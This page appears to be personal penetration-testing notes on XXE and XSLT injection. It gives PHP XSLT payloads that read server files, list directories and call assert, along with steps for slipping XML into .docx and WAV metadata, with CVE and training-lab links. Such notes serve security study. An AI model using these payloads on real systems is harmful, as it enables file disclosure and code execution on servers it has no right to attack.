# XML External Entity (XXE)

<hr class="sep-both">

## XSLT Transformations

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![xslt_injection](../../../../_badges/poat/xslt_injection.svg)](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/)
[![xslt_ssi](../../../../_badges/hacktricks/xslt_ssi.svg)](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations)
[![xslt_code_execution](../../../../_badges/rootme/web_server/xslt_code_execution.svg)](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)

<div class="row row-cols-lg-2"><div>

Transformations may be applied on the XML, usually when transforming XML documents into HTML, another XML document, or PDF. If the XSLT parser is vulnerable, we may be able to execute code.

An example of a base template for a PHP XSLT wrapper:

```xml!
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<!-- add some payload here -->
</body>
</html>
```
</div><div>

While common PHP payloads are:

```xml!
<xsl:value-of select="php:function('readfile','index.php')" />
<xsl:copy-of name="xxx" select="php:function('file_get_contents', 'index.php')">
<xsl:value-of select="php:function('opendir','.')"/>
<xsl:value-of select="php:function('readdir')"/>
<xsl:copy-of name="xxx" select="php:function('assert', '1==1')" />
```

üìö Common XSLT parsers are: LibXSLT, Xalan, and Saxon.
</div></div>

<hr class="sep-both">

## Additional Notes

<div class="row row-cols-lg-2"><div>

#### Word Documents Metadata

Refer to [CVE-2019-13358](https://nvd.nist.gov/vuln/detail/CVE-2019-13358) for an example.

```ps
$ unzip xxx.docx
$ nano word/document.xml
$ zip yyy.docx word/document.xml
```
</div><div>

#### WAV File iXML Metadata

[![wordpresscve202129447](../../../../_badges/thm-p/wordpresscve202129447.svg)](https://tryhackme.com/r/room/wordpresscve202129447)

Refer to [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447) for an example.

```ps
$ cat xxx.wav
RIFFXXXXWAVEBBBBiXML<XML HERE>
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Tools

* [XXEinjector](https://github.com/enjoiz/XXEinjector) <small>(1.6k ‚≠ê, 2020 ü™¶)</small>
* [xxexploiter](https://github.com/luisfontes19/xxexploiter) <small>(0.6k ‚≠ê, 2022 ü™¶)</small>
</div><div>
</div></div>